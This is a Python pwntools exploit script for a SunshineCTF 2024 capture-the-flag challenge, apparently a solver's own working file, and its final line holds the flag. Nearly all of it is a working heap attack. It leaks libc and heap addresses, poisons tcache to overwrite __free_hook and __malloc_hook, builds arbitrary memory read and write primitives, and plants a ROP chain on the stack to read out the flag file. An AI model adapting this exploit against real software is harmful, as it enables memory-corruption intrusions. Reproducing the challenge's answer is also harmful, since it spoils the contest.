#!/usr/bin/env python3

from pwn import *
from rich import print
from tqdm import trange
import random

exe = ELF("./secure_flag_terminal_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.terminal = ["tmux", "splitw", "-h"]
context.timeout = 1


def getRanges(io):
    if not hasattr(io, "proc"):
        return {}, {"libc_32.so.6": (-1, -1)}

    mmap = open(f"/proc/{io.proc.pid}/maps").read()
    lines = mmap.strip().split("\n")
    
    sections = set(line.split(" ", 5)[5].strip() for line in lines)
    sections = [s for s in sections if s.strip()]
    sections = [section.split("/")[-1] for section in sections]

    ranges = {}
    for section in sections:
        # print(f"Section: {section}")
        section_lines = [line for line in lines if section in line]
        start_of_section = int(section_lines[0].split("-")[0], 16)
        end_of_section = int(section_lines[-1].split("-")[1].split(" ")[0], 16)
        ranges[section] = (start_of_section, end_of_section)
    
    return ranges

startTime = None
def conn():
    global startTime
    startTime = time.time()
    if args.LOCAL:
        r = process([exe.path])
    elif args.GDB:
        context.timeout = None

        # r = process([exe.path])
        # gdb.attach(r, gdbscript=GDBSCRIPT)
        r = gdb.debug([exe.path], gdbscript=GDBSCRIPT)
    elif args.BRUH:
        r = process([exe.path])
        print(r.pid)
    elif args.STRACE:
        r = process(["strace", "-o", "strace", exe.path])
    else:
        r = remote("2024.sunshinectf.games", 24002)

    return r


def touch(r, size):
    r.sendlineafter(b"Enter option: ", b"1")
    r.sendlineafter(b"Enter size of flag --> ", str(size).encode())
    assert r.recvline().strip().startswith(b"Allocating space within storage array..")
    assert r.recvline().strip().startswith(b"SUCCESS")

def touchFailing(r, size):
    r.sendlineafter(b"Enter option: ", b"1")
    r.sendlineafter(b"Enter size of flag --> ", str(size).encode())
    assert r.recvline().strip().startswith(b"Allocating space within storage array..")
    assert r.recvline().strip().startswith(b"ERROR")

def touchNoAssert(r, size):
    r.sendlineafter(b"Enter option: ", b"1")
    r.sendlineafter(b"Enter size of flag --> ", str(size).encode())

def write(r, idx, data):
    assert len(data) <= 0xb4
    r.sendlineafter(b"Enter option: ", b"2")
    r.sendlineafter(b"Enter flag # to edit", str(idx+1).encode())
    r.sendafter(b"Enter new flag --> ", data)

def writeInvalid(r, idx, data):
    assert len(data) <= 0xb4
    r.sendlineafter(b"Enter option: ", b"2")
    r.sendlineafter(b"Enter flag # to edit", str(idx+1).encode())
    r.sendafter(b"Enter new flag --> ", data)

def cat(r, idx):
    r.sendlineafter(b"Enter option: ", b"3")
    r.sendlineafter(b"Enter flag # to view", str(idx+1).encode())
    r.recvuntil(b"=====\n\n")
    got = r.recvuntil(b"====================\n")
    assert got.endswith(b"\n====================\n")
    return got[:-len(b"\n====================\n")]

def remove(r, idx):
    r.sendlineafter(b"Enter option: ", b"4")
    r.sendlineafter(b"Enter flag # to remove --> ", str(idx+1).encode())
    assert r.recvline().strip().startswith(b"Removing flag")
    assert r.recvline().strip().startswith(b"Defragmenting storage array...")
    assert r.recvline().strip().startswith(b"SUCCESS")


def hitBreakpoint(r):
    if not hasattr(r, "pid"):
        print("[i] Skipping breakpoint")
        return
    r.sendlineafter(b"Enter option: ", b"3")
    r.sendlineafter(b"Enter flag # to view --> ", str(125).encode())
    assert r.recvline().strip().startswith(b"Invalid flag #")

def ripControl(r):
    DEBUG_BINARY_LEAK = getRanges(r)["secure_flag_terminal_patched"][0]
    # TARGET = 0xDEADBEEFDEADBEEF
    TARGET = libc.symbols['__free_hook']
    # TARGET = libc.address + 0x3eb000
    # TARGET = DEBUG_BINARY_LEAK + 0x203000

    ## Write to __free_hook
    touch(r, 8)
    touch(r, 8)
    touch(r, 8)
    hitBreakpoint(r)

    remove(r, 2)
    remove(r, 1)
    hitBreakpoint(r)

    ## Overwrite previous pointer
    write(r, 0, p64(0) + p64(0) + p64(0) + p64(0x21) + p64(TARGET)*2)

    touch(r, 8)
    hitBreakpoint(r)

    touch(r, 8)
    hitBreakpoint(r)
    write(r, 2, p64(0xDEADBEEFDEADBEEF))
    hitBreakpoint(r)

    ## Trigger free
    remove(r, 2)

    # ## Clean up 2/3 used flag_stores
    # remove(r, 1)
    # remove(r, 0)
    # hitBreakpoint(r)


GDBSCRIPT = """
source tracer.py
c
# findstackaddress
"""

def main():
    r = conn()
    libc.address = 0
    exe.address = 0

    r.recvuntil(b"Kernel Seed: ")
    kernel_seed = int(r.recvline().strip(), 16)
    libc_leak = kernel_seed - libc.symbols["rand"] 
    libc.address = libc_leak
    print(f"[+] Libc base: {hex(libc_leak)}")
    print(f"[+] Free hook: {hex(libc.symbols['__free_hook'])}")


    ## Get heap leak
    touch(r, 8)
    touch(r, 8)
    hitBreakpoint(r)

    remove(r, 1)
    hitBreakpoint(r)

    write(r, 0, b"L"*40)
    heap_leak = cat(r, 0)[40:]
    heap_leak = u64(heap_leak.ljust(8, b"\x00")) - 0x10
    if heap_leak & 0xfff != 0 or heap_leak < 0x1_00_00_00_00_00 or heap_leak == 0:
        print("[-] Heap leak {heap_leak} scuffed")
        r.close()
        return False
    print(f"[+] Heap leak: {hex(heap_leak)}")

    ## Clean up from the leak
    write(r, 0, p64(0) + p64(0) + p64(0) + p64(0x21) + p64(0))
    remove(r, 0)
    hitBreakpoint(r)


    # TARGET = 0xDEADBEEFDEADBEEF
    # TARGET = libc.symbols['__free_hook']
    # TARGET = libc.address + 0x3eb000 + 0x500
    TARGET = heap_leak + 0x1270
    # TARGET = libc..got + 0x32
    # TARGET = libc.get_section("got")
    print(f"[+] Target for flag fd: {hex(TARGET)}")


    ## Write to __free_hook
    touch(r, 8)
    touch(r, 8)
    touch(r, 8)
    hitBreakpoint(r)

    remove(r, 2)
    remove(r, 1)
    hitBreakpoint(r)

    ## Overwrite previous pointer
    write(r, 0, p64(0) + p64(0) + p64(0) + p64(0x21) + p64(TARGET)*2)

    touch(r, 8)
    hitBreakpoint(r)

    touch(r, 8)
    hitBreakpoint(r)

    fd_leak = cat(r, 2)
    fd_leak = u64(fd_leak.ljust(8, b"\x00"))
    print(f"[+] Flag fd: {fd_leak}")

    ## Clean up
    write(r, 2, p64(0) + p64(0) + p64(0) + p64(0x21) + p64(0))
    remove(r, 2)
    remove(r, 1)
    remove(r, 0)
    hitBreakpoint(r)



    ## At this point, we have a heap leak, a libc leak and a flag fd leak and have cleared up all 4 flag_stores
    print("[+] Clean slate, going binary leak, then going for an allocation at the start of the number_of_flags, for arb reads/writes")
    # print(libc.symbols.keys())
    
    """ Malloc hook register state:
    RAX  0xdeadbeefdeadbeef
    RBX  2
    RCX  0x7d8d63b10104 (write+20) ◂— cmp rax, -0x1000 /* 'H=' */
    RDX  0x7d8d63ded8c0 (_IO_stdfile_1_lock) ◂— 0
    RDI  CONTROLLED BY US
    RSI  0x606d02c01137 ◂— mov rcx, rax
    R8   0x28
    R9   0
    R10  0x7d8d63b9ebc0 (_nl_C_LC_CTYPE_class+256) ◂— add al, byte ptr [rax]
    R11  0x246
    R12  0x606d02c00b40 ◂— xor ebp, ebp
    R13  0x7fff2dc77de0 ◂— 1
    R14  0
    R15  0
    RBP  0x7fff2dc77cd0 —▸ 0x7fff2dc77d00 —▸ 0x606d02c017e0 ◂— push r15
    RSP  0x7fff2dc77ca8 —▸ 0x606d02c01137 ◂— mov rcx, rax
    RIP  0x7d8d63a9723b (malloc+539) ◂— jmp rax
    """
    
    TARGET = libc.symbols['__malloc_hook']
    ## When we malloc, rsi holds a binary leak
    WRITE_RSI_INTO_RDI_GADGET = libc.address + 0x000000000009d642 # 0x000000000009d642 : xor eax, eax ; mov qword ptr [rdi], rsi ; ret
    FLAGSTORE0 = heap_leak + 0x1290

    ## Write to __malloc_hook
    touch(r, 8) ## to overwrite the values in the following ones
    touch(r, 8) ## a
    touch(r, 8) ## b
    hitBreakpoint(r)

    remove(r, 2) ## free b
    remove(r, 1) ## free a
    hitBreakpoint(r)

    ## Overwrite previous pointer of b
    write(r, 0, p64(0) + p64(0) + p64(0) + p64(0x21) + p64(TARGET)*2)
    touch(r, 8) ## a, such that the next malloc will be at the target
    touch(r, 8) ## b at the target
    write(r, 2, p64(WRITE_RSI_INTO_RDI_GADGET))


    remove(r, 1) ## remove a, malloc_hook = 1

    print("[+] Storage: ", hex(FLAGSTORE0))
    touchFailing(r, FLAGSTORE0) ## Call malloc_hook without requiring a new flag_store, because rax = 0!
    hitBreakpoint(r)
    binary_leak = cat(r, 0)
    binary_leak = u64(binary_leak.ljust(8, b"\x00")) - 0x1137
    exe.address = binary_leak
    if binary_leak & 0xfff != 0 or binary_leak < 0x1_00_00_00_00_00 or binary_leak == 0:
        print("[-] Binary leak {binary_leak} scuffed")
        r.close()
        return False
    print("[+] Binary leak: ", hex(binary_leak))
    NUMBER_OF_FLAGS = exe.address + 0x020304C
    FLAGSTORES = exe.address + 0x0203060

    ## Clean up
    print("Cleaning up")
    write(r, 1, p64(0)) ## disable the malloc_hook

    touch(r, 8) ## a = 2
    touch(r, 8) ## b = 3
    hitBreakpoint(r)

    remove(r, 3) ## free b
    remove(r, 2) ## free a

    """
    TARGET = libc.symbols["program_invocation_short_name"]

    ## Overwrite previous pointer of b
    write(r, 0, p64(0) + p64(0) + p64(0) + p64(0x21) + p64(TARGET)*2)
    touch(r, 8) ## a = 2, such that the next malloc will be at the target
    touch(r, 8) ## b = 3 at the target
    remove(r, 2) ## free a, b becomes 2

    stack_leak = cat(r, 2)
    stack_leak = u64(stack_leak.ljust(8, b"\x00")) - 0x20d61
    print(f"[+] Stack leak: {hex(stack_leak)}")
    """
    
    ### Get a thing at the start of the number_of_flags
    TARGET = NUMBER_OF_FLAGS

    ## Overwrite previous pointer of b
    write(r, 0, p64(0) + p64(0) + p64(0) + p64(0x21) + p64(TARGET)*2)
    touch(r, 8) ## a = 2, such that the next malloc will be at the target
    touch(r, 8) ## b = 3 at the target
    remove(r, 2) ## free a, b becomes 2
    print(f"[+] Got a thing at the start of the number_of_flags = {hex(NUMBER_OF_FLAGS)}")

    write(r, 2, flat({0: 4, (FLAGSTORES - NUMBER_OF_FLAGS): [NUMBER_OF_FLAGS, 2, 3, 4]}))
    hitBreakpoint(r)

    write(r, 0, flat({0: 4, (FLAGSTORES - NUMBER_OF_FLAGS): [NUMBER_OF_FLAGS, 69, 3, 69]}))
    hitBreakpoint(r)

    
    def arbWrite(addr, data):
        write(r, 0, flat({0: 4, (FLAGSTORES - NUMBER_OF_FLAGS): [NUMBER_OF_FLAGS, addr, 0x1337, 0x1337]}))
        write(r, 1, data)

    def arbRead(addr):
        write(r, 0, flat({0: 4, (FLAGSTORES - NUMBER_OF_FLAGS): [NUMBER_OF_FLAGS, addr, 0x1337, 0x1337]}))
        return cat(r, 1)
    
    def arbReadPointer(addr):
        return u64(arbRead(addr)[:8].ljust(8, b"\x00"))
    

    some_stack_pointer = arbReadPointer(libc.symbols["program_invocation_short_name"] + 8)
    some_stack_pointer = some_stack_pointer & 0xfffffffffffff0
    print(f"[+] some_stack_pointer: {hex(some_stack_pointer)}")
    print("\n\n\n\n")
    print(f"[+] Going to find the right pointer, we have spent {time.time() - startTime:.2f}s")

    print(arbRead(some_stack_pointer))

    def getCompleteMemory(addr, length):
        memory = b""
        try:
            while length > 0:
                got = arbRead(addr) + b"\x00"
                memory += got
                addr += len(got)
                length -= len(got)
                if time.time() - startTime > 18:
                    print(f"[+] Got {len(memory)} bytes")
                    break
        except AssertionError:
            print(f"[+] Got {len(memory)} bytes")
        return memory
    
    # stackMemory = getCompleteMemory(some_stack_pointer, 0x100)
    # print(stackMemory)
    # quit()

    def slowFind():
        for i in trange(0 if args.GDB else 8*random.randint(0, 2000), 0x220000, 8):
        # for i in trange(0, 0x220000, 8):
            addr = some_stack_pointer - i
            p = arbReadPointer(addr)
            AFTER_CAT_FLAG = exe.address + 0x0170B
            # print(f"[+] Checking {hex(addr)} = stack[{i}]  -> {hex(p)}")
            if p in range(exe.address, exe.address + 0x6000):
                offset = p - exe.address
                print(f"[+] Found an exe address, {hex(addr)} = stack[{i}]  -> {hex(p)} {hex(offset)} {p - AFTER_CAT_FLAG}")
                if p == AFTER_CAT_FLAG:
                    print("[+] " + "MONEY"*100)
                    return addr
        assert 0

    def slowScan(start):
        yeah = []
        for i in trange(start, 0x10000, 8):
        # for i in trange(0, 0x220000, 8):
            addr = some_stack_pointer - i
            p = arbReadPointer(addr)
            AFTER_CAT_FLAG = exe.address + 0x0170B
            # print(f"[+] Checking {hex(addr)} = stack[{i}]  -> {hex(p)}")
            if p in range(exe.address, exe.address + 0x6000):
                offset = p - exe.address
                print(f"[+] Found an exe address, {hex(addr)} = stack[{i // 8}*8={i}]  -> {hex(p)} {hex(offset)} {p - AFTER_CAT_FLAG}")
                yeah.append((i, offset, p - AFTER_CAT_FLAG))
                if p == AFTER_CAT_FLAG:
                    print("[+] " + "MONEY"*10)

        with open("yeah.py", "a+") as f:
            f.write(f"good = {yeah}\n")

    def fastFind(start, step=8*11):
        base = exe.address
        ## Found with slowScan
        good = [(6632, 2880, -3019), (7416, 2922, -2977), (7432, 2880, -3019), (7552, 2880, -3019), (7576, 5761, -138), (7616, 6112, 213), (7648, 6112, 213), (7656, 5899, 0), (7688, 5027, -872), (7712, 2880, -3019), (7768, 2880, -3019), (7872, 7480, 1581), (7952, 2880, -3019), (7968, 2880, -3019), (9360, 7446, 1547), (9376, 7240, 1341), (9544, 7309, 1410), (19104, 7447, 1548), (19136, 7448, 1549), (19264, 7437, 1538), (19280, 7256, 1357), (19336, 7446, 1547), (19352, 7240, 1341), (19360, 7398, 1499), (19376, 7257, 1358)]
        wantedI = [i for i, exeOffset, offsetToWanted in good if offsetToWanted == 0][0]
        iDifferenceLookup = {base + exeOffset: wantedI - i for i, exeOffset, offsetToWanted in good}

        for i in trange(start, 0x10000, step):
            addr = some_stack_pointer - i
            p = arbReadPointer(addr)
            if p in iDifferenceLookup:
                iDifference = iDifferenceLookup[p]
                addr = some_stack_pointer - (i + iDifference)
                print(f"[+] Fast found exe at {hex(addr)}, through exeOffset {hex(p - exe.address)}, iDifference {iDifference}")
                return addr


    # slowScan(start=0)
    # slowScan(start=8*random.randint(0, 2000))
    # slowScan(start=0)
    # fastFind(0)
    # quit()

    # TO_OVERWRITE = None
    # for i in trange(0x3200, 0x10000, 8):
    #     addr = some_stack_pointer - i
    #     p = arbReadPointer(addr)
    #     AFTER_VIM_FLAG = exe.address + 0x16FF
    #     AFTER_CAT_FLAG = exe.address + 0x0170B
    #     # if p == AFTER_CAT_FLAG:
    #     print(f"[+] Checking {hex(addr)} = stack[{i}]  -> {hex(p)}")
    #     if p in range(exe.address, exe.address + 0x6000):
    #         offset = p - exe.address
    #         print(f"[+] Found exe address, {hex(addr)} = stack[{i}]  -> {hex(p)} {hex(offset)} {p - AFTER_CAT_FLAG}") ##  {exe.disasm(p, 0x10)}
    #         if p == AFTER_CAT_FLAG:
    #             TO_OVERWRITE = addr
    #             break

    # if TO_OVERWRITE is None:
    #     print("[-] Failed to find exe address")
    #     return True ## Could do a retry here

    rop = ROP(libc)
    ADDR_FOR_FLAG = NUMBER_OF_FLAGS
    rop.read(fd_leak, ADDR_FOR_FLAG, 0x100)
    # rop.write(1, ADDR_FOR_FLAG, 0x100)
    rop(rdi=1, rsi=ADDR_FOR_FLAG, rdx=0x100, rax=1)
    rop.raw(rop.find_gadget(["syscall"]))
    rop.read(0, ADDR_FOR_FLAG, 0x100)
    

    TO_OVERWRITE = fastFind(0)
    arbWrite(TO_OVERWRITE, rop.chain())
    print(rop.dump())


    ## Overwrite 0x7fffe4de94a8

    print(r.recvall(timeout=1))
    quit()
    # r.interactive()
    return True


if __name__ == "__main__":
    if not (args.LOCAL or args.GDB or args.BRUH or args.STRACE) or True:
        while True:
            try:
                main()
            except AssertionError as e:
                print(e)
    while not main():
        print("\n\n\n[-] Exploit failed, trying again")


## sun{H0us3_Of_F0rcE_w1th_4_fUn_tW!$t}